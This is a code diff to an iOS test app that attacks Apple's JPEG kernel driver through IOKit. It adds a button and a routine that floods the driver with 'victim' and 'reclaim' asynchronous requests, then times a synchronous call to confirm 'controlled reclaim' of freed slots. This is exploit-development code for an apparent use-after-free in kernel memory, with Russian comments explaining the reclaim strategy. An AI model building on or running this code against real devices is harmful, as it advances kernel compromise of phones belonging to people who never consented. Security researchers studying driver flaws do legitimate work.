@@ -124,6 +124,7 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
 @property (nonatomic, strong) UIButton *rcButton;
 @property (nonatomic, strong) UIButton *p3bButton;
 @property (nonatomic, strong) UIButton *runAllBtn;
+@property (nonatomic, strong) UIButton *p3bpBtn;
 @property (nonatomic, strong) UILabel *statusLabel;
 @property (nonatomic, assign) BOOL running;
 @end
@@ -186,6 +187,17 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     [runAllBtn addTarget:self action:@selector(runAllTests) forControlEvents:UIControlEventTouchUpInside];
     self.runAllBtn = runAllBtn;
 
+    // P3Bp button: progressive reclaim timing
+    UIButton *p3bpBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    [p3bpBtn setTitle:@"P3Bp: prog-reclaim" forState:UIControlStateNormal];
+    p3bpBtn.titleLabel.font = [UIFont boldSystemFontOfSize:14];
+    p3bpBtn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1.0];
+    p3bpBtn.layer.cornerRadius = 10;
+    [p3bpBtn setTitleColor:[UIColor systemOrangeColor] forState:UIControlStateNormal];
+    p3bpBtn.translatesAutoresizingMaskIntoConstraints = NO;
+    [p3bpBtn addTarget:self action:@selector(triggerP3Bp) forControlEvents:UIControlEventTouchUpInside];
+    self.p3bpBtn = p3bpBtn;
+
     // Hidden log view (still captures NSLog output for debugging)
     self.logView = [[UITextView alloc] init];
     self.logView.editable = NO;
@@ -202,6 +214,7 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     [self.view addSubview:self.rcButton];
     [self.view addSubview:self.p3bButton];
     [self.view addSubview:self.runAllBtn];
+    [self.view addSubview:self.p3bpBtn];
 
     UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
     [NSLayoutConstraint activateConstraints:@[
@@ -228,6 +241,10 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         [self.runAllBtn.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor constant:120],
         [self.runAllBtn.widthAnchor constraintEqualToConstant:200],
         [self.runAllBtn.heightAnchor constraintEqualToConstant:52],
+        [self.p3bpBtn.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
+        [self.p3bpBtn.topAnchor constraintEqualToAnchor:self.runAllBtn.bottomAnchor constant:12],
+        [self.p3bpBtn.widthAnchor constraintEqualToConstant:200],
+        [self.p3bpBtn.heightAnchor constraintEqualToConstant:44],
     ]];
 }
 
@@ -1961,6 +1978,91 @@ done:
     dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 30*NSEC_PER_SEC));
     BOOL h=[self checkDriverHealth:svc];
     [self log:@"  RESULT race done v=%d r=%d health=%@", vDone, rDone, h?@"OK":@"BROKEN"];
+}
+
+
+#pragma mark - Path 3B progressive reclaim timing
+
+// Контролируемый reclaim: реклайм-объекты с progressive=1 или progressive=0
+// Если reclaimed-слоты имеют prog=1, fullSpeedRequestExist пойдёт в другую ветку
+// Измерение: разница во времени sync trigger
+- (void)triggerP3Bp {
+    if (self.running) return;
+    self.running = YES;
+    [UIView animateWithDuration:0.2 animations:^{ self.logView.alpha = 1.0; }];
+    [self setStatus:@"P3Bp: progressive reclaim..."];
+
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        [self log:@"=== P3Bp: progressive reclaim timing ==="];
+        io_service_t svc = [self findJPEGService];
+        if (!svc) { [self log:@"no service"]; self.running = NO; return; }
+        BOOL healthy = [self checkDriverHealth:svc];
+        if (!healthy) { [self log:@"driver broken"]; IOObjectRelease(svc); self.running = NO; return; }
+
+        const uint32_t W = 2048, H = 2048;
+        NSData *jpegData = [self createTestJPEG:W height:H];
+        IOSurfaceRef vSrc = [self createSourceSurface:jpegData];
+        IOSurfaceRef vDst = [self createDestSurface:W height:H];
+        IOSurfaceRef rSrc = [self createSourceSurface:jpegData];
+        IOSurfaceRef rDst = [self createDestSurface:W height:H];
+        if (!vSrc||!vDst||!rSrc||!rDst) { IOObjectRelease(svc); self.running=NO; return; }
+        uint32_t vS=IOSurfaceGetID(vSrc), vD=IOSurfaceGetID(vDst);
+        uint32_t rS=IOSurfaceGetID(rSrc), rD=IOSurfaceGetID(rDst);
+
+        mach_timebase_info_data_t tbi; mach_timebase_info(&tbi);
+        const int DOSE=5, CYCLES=30, R_CONNS=3, R_REQS=5;
+
+        uint64_t (^syncTrigger)(void) = ^uint64_t{
+            io_connect_t t = [self openUC:svc];
+            if (!t) return 0;
+            AppleJPEGDriverIOStruct in={0},out={0};
+            in.sourceID=rS; in.field_04=W*H; in.destID=rD; in.field_0C=W*H*4;
+            in.width=W; in.height=H; in.outWidth=W; in.outHeight=H;
+            in.subsampling=3; in.asyncToken=0;
+            size_t os=sizeof(out);
+            uint64_t t0=mach_absolute_time();
+            IOConnectCallStructMethod(t,1,&in,sizeof(in),&out,&os);
+            uint64_t t1=mach_absolute_time(); IOServiceClose(t);
+            return (t1-t0)*tbi.numer/tbi.denom/1000;
+        };
+
+        // A0: victim, reclaim(prog=0) — baseline
+        uint64_t timP0[CYCLES]; int np0=0;
+        [self log:@"  A0: victim + reclaim(prog=0)..."];
+        for (int c=0; c<CYCLES; c++) {
+            io_connect_t vc=[self openUC:svc];
+            if(vc){ [self submitAsyncRequestsFlags:vc srcID:vS dstID:vD width:W height:H count:DOSE tokenBase:0xA000+c progressive:NO]; IOServiceClose(vc); }
+            usleep(1000);
+            io_connect_t rcs[3]; int rn=0;
+            for(int r=0;r<R_CONNS;r++){ io_connect_t rc=[self openUC:svc]; if(rc){ [self submitAsyncRequestsFlags:rc srcID:rS dstID:rD width:W height:H count:R_REQS tokenBase:0xC000+c*0x10+r progressive:NO]; rcs[rn++]=rc; } }
+            uint64_t us = syncTrigger(); if(us) timP0[np0++]=us;
+            for(int r=0;r<rn;r++) IOServiceClose(rcs[r]);
+        }
+
+        // A1: victim, reclaim(prog=1) — прогрессивная ветка должна быть активна
+        uint64_t timP1[CYCLES]; int np1=0;
+        [self log:@"  A1: victim + reclaim(prog=1)..."];
+        for (int c=0; c<CYCLES; c++) {
+            io_connect_t vc=[self openUC:svc];
+            if(vc){ [self submitAsyncRequestsFlags:vc srcID:vS dstID:vD width:W height:H count:DOSE tokenBase:0xA000+c progressive:NO]; IOServiceClose(vc); }
+            usleep(1000);
+            io_connect_t rcs[3]; int rn=0;
+            for(int r=0;r<R_CONNS;r++){ io_connect_t rc=[self openUC:svc]; if(rc){ [self submitAsyncRequestsFlags:rc srcID:rS dstID:rD width:W height:H count:R_REQS tokenBase:0xC000+c*0x10+r progressive:YES]; rcs[rn++]=rc; } }
+            uint64_t us = syncTrigger(); if(us) timP1[np1++]=us;
+            for(int r=0;r<rn;r++) IOServiceClose(rcs[r]);
+        }
+
+        auto sort = ^(uint64_t *arr, int n) { for(int i=0;i<n-1;i++) for(int j=i+1;j<n;j++) if(arr[i]>arr[j]){uint64_t t=arr[i];arr[i]=arr[j];arr[j]=t;} };
+        sort(timP0, np0); sort(timP1, np1);
+        uint64_t m0=np0?timP0[np0/2]:0, m1=np1?timP1[np1/2]:0;
+        [self log:@"  RESULT prog0=%llu prog1=%llu us diff=%+lld", m0, m1, (int64_t)m1-(int64_t)m0];
+        [self log:@"  (if diff != 0 -> controlled reclaim confirmed: prog flag in freed slot)"];
+
+        CFRelease(vSrc); CFRelease(vDst); CFRelease(rSrc); CFRelease(rDst);
+        IOObjectRelease(svc);
+        dispatch_async(dispatch_get_main_queue(), ^{ [self setStatus:@"P3Bp done"]; });
+        self.running = NO;
+    });
 }
 
 @end
